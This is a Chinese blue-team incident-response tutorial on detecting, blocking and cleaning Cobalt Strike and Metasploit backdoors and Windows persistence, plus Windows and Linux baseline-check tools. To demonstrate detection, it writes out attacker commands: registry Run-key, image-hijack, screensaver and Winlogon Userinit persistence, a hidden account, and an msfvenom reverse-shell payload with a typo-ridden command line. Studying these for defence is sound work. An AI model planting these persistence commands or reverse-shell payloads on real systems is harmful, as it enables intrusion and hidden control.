# 蓝队技能-应急响应篇&C2后门&权限维持手法&Windows&Linux基线检查&排查封锁清理

![image-20251005171441542](https://img.yatjay.top/md/20251005171441589.png)

## 知识点

1、应急响应-C2后门-排查&封锁

2、应急响应-权限维持-排查&清理

3、应急响应-基线检测-整改&排查

---

一般地，蓝队的工作分为如下三个阶段，普通蓝队仅做到第一点即可

- 封锁：即找到攻击者并封锁IP
- 溯源：详细分析
- 反制：通过漏洞利用等手段反制攻击者的资产，如通过爆破得到攻击者CS服务器账号密码从而控制

本节主要是三个知识点

1. C2常规后门排查
2. 常见服务器权限维护
3. 报告中的基线

进阶(后续课程会讲到)：

- 隐匿的后门(如Rookit后门、采用中转云函数等C2后门)
- web内存马

## 演示案例

### 蓝队技能-C2后门&权限维持-基线检查&查杀封锁

C2后门是一段被植入到受害系统中的**恶意代码**或**程序**。它的唯一目的就是**秘密地维持一条通向攻击者C2服务器的网络连接**，并等待和执行从C2服务器发来的指令。C2后门一般需要网络连接，因此作为蓝队，需要分析其进程行为尤其是网络连接情况，主要使用进程分析工具火绒剑，具体操作见下。

#### Windows实验-常规C2后门排查

##### 后门生成与上传

使用Cobalt Strike生成一个C2后门，名为`http.exe`

![image-20251005211538612](https://img.yatjay.top/md/20251005211538661.png)

将后门程序丢到目标主机上去

![image-20251005211759015](https://img.yatjay.top/md/20251005211759049.png)

##### 进程分析与进程网络连接情况

打开火绒剑独立版，查看进程信息尤其是网络连接信息。在火绒剑中，尤其需要注意安全状态为“未知文件”的进程，未知文件说明不是系统文件也不是合规签名的安全文件，一般就是小公司或个人的程序进程

一般地，如`httpd.exe`是Apache的进程，`mysqld.exe`是MySQL的进程，一些只和本地通联的进程是系统使用的，一般不是可疑进程，但是不能仅通过进程名称就排除，还是要看具体行为如网络连接情况

![image-20251005211913723](https://img.yatjay.top/md/20251005211913799.png)

执行上述`http.exe`文件，从攻击者Cobalt Strike一侧可以看到后门程序上线，C2后门会向攻击者主机发送心跳包，出现网络连接行为

![image-20251005212343430](https://img.yatjay.top/md/20251005212343484.png)

此时再查看火绒剑网络信息情况，可看到后门通信(没有的话刷新进程或者重启火绒剑)

![image-20251005212555810](https://img.yatjay.top/md/20251005212555917.png)

##### 上传在线威胁情报查询

按蓝队思路，找到后门进程，定位后门程序之后，应当将这些程序上传至一些威胁感知平台在线分析如[微步在线云沙箱](https://s.threatbook.com/)、[奇安信威胁情报](https://ti.qianxin.com/)等，这些在蓝队工具箱中一般都会提供。

![image-20251005213014510](https://img.yatjay.top/md/20251005213014563.png)

只要这些后门程序没做免杀处理或者免杀做得不好，一般都能够通过在线平台识别出来。我们将刚才的http.exe上传至微步在线分析，可以定性分析出

- 该程序是哪种C2工具生成的如：msf、cs、viper、sliver、vshell、havoc、响尾蛇chaos等
- IP域名信息

![image-20251005213305627](https://img.yatjay.top/md/20251005213305679.png)

此外，除了直接将exe文件上传至在线分析平台，也可以通过IOC信息来确定，IOC类似MD5值，是文件的唯一标识信息，将IOC上传至网络空间搜索引擎，可以直接搜到有无类似的，一般用来确定如挖矿病毒、病毒家族等，后门文件识别中比较少用

##### 人工分析后门程序

人工分析后门程序主要有2种方法，演示略

- 数据包流量分析：各类C2工具流量具备特征
- 文件逆向分析

##### 后门程序清理

进程树结束后删除程序，某些后门可能需要重启后删除或者降权删除

##### 后门封锁

1. 封锁进程名：一般不封锁进程名称，因为攻击者有可能更换进程名导致封锁失效

2. 封锁网络连接：一般使用防火墙策略，封锁攻击者IP或域名。简单粗暴，缺点在于
   - 限制入流量还是出流量不灵活
   - 如果存在跳板机则封锁策略失效
   - 进阶红队能够绕过
3. 限制协议：封锁网络连接协议，此时红队就要通过隧道传输数据

##### 权限维持的检测与清除-火绒剑分析启动项

在Windows上植入C2后门之后，攻击者往往会通过一些手段进行权限维持如

- 将后门程序添加至自启动
- 添加隐藏账户
- 映像劫持

一般通过火绒剑能够分析得知

###### 添加自启动

使用如下命令，可以将某个后门程序添加至自启动

```cmd
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "backdoor" /t REG_SZ /F /D "C:\shell.exe"
```

在火绒剑——启动项，查找我们启动的程序进程

![image-20251005234049159](https://img.yatjay.top/md/20251005234049288.png)

除了添加自启动之外，还有如下手法进行权限维持

###### 隐藏账户

1、隐藏账户：下面命令表示，在当前的 Windows 系统上，创建一个名为 `xiaodi$`的隐藏用户账户，并将其密码设置为 `xiaodi!@#X123`。这里的美元符号 `$`有特殊含义：它表示在系统中**隐藏**这个用户账户。当你在“计算机管理”或使用 `net user`（不加参数）查看所有用户列表时，这个用户默认不会显示出来，从而达到一定的隐蔽目的。**这是一种常见的攻击者用于创建隐藏后门账户的手法。**

```cmd
net user xiaodi$ xiaodi!@#X123 /add
```

###### 映像劫持

2、映像劫持：下面命令是指，当用户启动`notepad.exe`程序时，实际是用`cmd.exe`启动计算器程序，若吧计算器改成后门程序地址，则执行后门程序

```cmd
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe /c calc"
```

###### 屏保&登录

3、屏保&登录：下面这条命令将系统的屏幕保护程序替换为恶意的 `C:\shell.exe`文件。当计算机闲置一段时间（达到屏幕保护程序启动时间）后，系统不会运行正常的屏保（如“气泡”、“照片”），而是会**执行 `C:\shell.exe`这个程序**。如果这是一个后门程序，攻击者就通过这种方式实现了持久化。

```cmd
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\shell.exe" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\shell.exe"
```

#### Windows安全基线检查工具

基线检查工具的基线条件比较苛刻，一般都会扫出系统安全配置方面的问题，但这些问题并非能够直接导致系统受到攻击或直接导致系统崩溃。

使用这些安全基线检查工具，更多的用处是体现蓝队的工作量，当把这些写到蓝队报告当中时，可以看出该工作人员做到位了

##### Golin

https://github.com/selinuxG/Golin

在Windows命令行中以管理员权限上运行Golin，该软件能够收集该Windows主机的一些安全相关配置如防火墙策略等信息，并形成整改意见

运行界面如下

![image-20251005235836396](https://img.yatjay.top/md/20251005235836466.png)

##### WindowsBaselineAssistant

https://github.com/DeEpinGh0st/WindowsBaselineAssistant

运行界面如下

![image-20251005235813931](https://img.yatjay.top/md/20251005235814015.png)

##### FindAll

https://github.com/FindAllTeam/FindAll

运行界面如下

![image-20251006000322946](https://img.yatjay.top/md/20251006000323003.png)

FindAll除了像上面两个程序一样，在主机上直接执行外，还支持在远程主机上执行，具体做法是：在远程主机上运行`FindAllAgent.exe`程序，收集信息并得到`result.hb`文件后，将该`result.hb`文件拖回到本地，在本地的`FindAll.exe`上上传该文件进行分析

![image-20251006000851328](https://img.yatjay.top/md/20251006000851411.png)

拖回本地上传分析

![image-20251006000943050](https://img.yatjay.top/md/20251006000943092.png)

本地进行分析后可得到远程主机的安全基线检测结果

![image-20251006001038808](https://img.yatjay.top/md/20251006001038867.png)

##### d-eyes

https://github.com/m-sec-org/d-eyes

d-eyes支持多种基线检测，如：

- fs文件检测，可以检测后门文件。下面的检测结果表示`1.exe`文件触发了Cobalt Strike的基线检测规则

  ![image-20251006001448019](https://img.yatjay.top/md/20251006001448074.png)

- autorun启动项检测，可以检测启动项。下面结果表示存在一个名为shell.exe的自启动项

  ![image-20251006001401339](https://img.yatjay.top/md/20251006001401391.png)

#### Linux安全基线检查工具

##### linuxcheckshoot

https://github.com/sun977/linuxcheckshoot

该工具分析主机的安全基线如服务项、权限维持等

运行界面如下

![image-20251006002010190](https://img.yatjay.top/md/20251006002010302.png)

检测结果如下

![image-20251006002818665](https://img.yatjay.top/md/20251006002818750.png)

##### Whoamifuck

https://github.com/enomothem/Whoamifuck

使用方法可见[HW通用应急响应分析Webshell查杀脚本|应急分析](https://mp.weixin.qq.com/s/fcVMStVXu0BploXWopaHtQ)

运行界面如下

![image-20251006002310680](https://img.yatjay.top/md/20251006002310819.png)

如关于用户登录排查

使用 `-l` 参数显示系统的用户登录信息。该参数取代之前`-f`参数，对比`-f`，优化了以下功能：

1. 首先判断是否存在文件参数，能够在当前系统分析不同系统的文件类型。如用户指定了具体的文件路径，那么将分析文件名是auth.log还是secure，请注意从其它系统导出的日志文件名是否正确。
2. 用户没有指定具体的文件，那么会判断操作系统是红帽系还是debian系，如果是红帽系的系统则使用secure默认路径，debian系列则使用auth.log文件默认路径。
3. 如果用户没有指定具体的文件，系统也没有识别正确，如遇到阉割版的操作系统，则默认使用红帽系列的判断方法执行，则可指定具体文件的方法。

```bash
./whoamifuck -l
```

会列举出攻击次数的攻击者枚举的用户名、攻击者IP TOP10、成功登录的IP地址和对用户名进行爆破的次数

![图片](https://img.yatjay.top/md/20251006002206830.png)

![图片](https://img.yatjay.top/md/20251006002228199.webp)

##### Golin

https://github.com/selinuxG/Golin

和在Windows上类似，也可运行web界面在web配置，web运行图示如下

![image-20251006002428380](https://img.yatjay.top/md/20251006002428450.png)

##### d-eyes

https://github.com/m-sec-org/d-eyes

和在Windows上类似，运行界面如下

![image-20251006002712653](https://img.yatjay.top/md/20251006002712720.png)

##### Ashro_linux

https://github.com/Ashro-one/Ashro_linux

和上面这些工具类似，不常用，主要检测挖矿病毒等，检测结果如下

![image-20251006002956236](https://img.yatjay.top/md/20251006002956280.png)

#### Linux实验-常规C2后门排查

##### 后门生成与上传

###### Cobalt Strike后门

使用CS生成一个Linux后门

![image-20251006102305121](https://img.yatjay.top/md/20251006102305185.png)



![image-20251006102328289](https://img.yatjay.top/md/20251006102328334.png)

将该后门程序上传至目标主机并执行

![image-20251006102543448](https://img.yatjay.top/md/20251006102543492.png)

在攻击端刷新CS可见目标上线

![image-20251006102626371](https://img.yatjay.top/md/20251006102626424.png)

此时在目标Linux主机使用`netstat`查看网络连接情况，无法找到后门程序进程的网络连接。但此时CS已经可以操作目标主机的目录、文件，就是没有网络连接

![image-20251006102744866](https://img.yatjay.top/md/20251006102744908.png)

这是因为：CS工具生成的后门，为避免系统检测，其网络连接是时有时无的，也就是说这是由于CS的通讯机制，间歇式通讯，不是传统的webshell

> 在cs中默认的心跳时间是60s,我们可以用sleep 命令来更改心跳时间（心跳时间是指上线的服务器和cs服务器的通信时间）
>
> 心跳时间很长就会响应的时间很慢，但也不能设置的很短，不然很容易会被监测到与cs通信的流量，具体多少可以根据测试环境自己来设置。

###### Metasploit Framework(msf)后门

使用MSF生成后门`1234.elf`

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp-LH0ST=192.168.1.9 LP0RT=1234 -f e1f >1234.e1f
```

启动msfconsole，开启监听

![image-20251006103741682](https://img.yatjay.top/md/20251006103741757.png)

将后门上传至目标主机并执行

![image-20251006103844247](https://img.yatjay.top/md/20251006103844288.png)

回到攻击者MSF Console，发现目标主机已经上线

![image-20251006103943011](https://img.yatjay.top/md/20251006103943053.png)

此时再目标主机上，直接使用`netstat`或者使用基线检查工具查看网络连接情况，发现能够看到MSF后门的网络连接情况

![image-20251006104115504](https://img.yatjay.top/md/20251006104115545.png)

![image-20251006104047635](https://img.yatjay.top/md/20251006104047680.png)

##### 使用基线检查工具排查可疑进程/可疑文件

使用上面提到的Linux安全基线检查工具，执行后可检测可疑文件、可疑网络连接，操作略

  





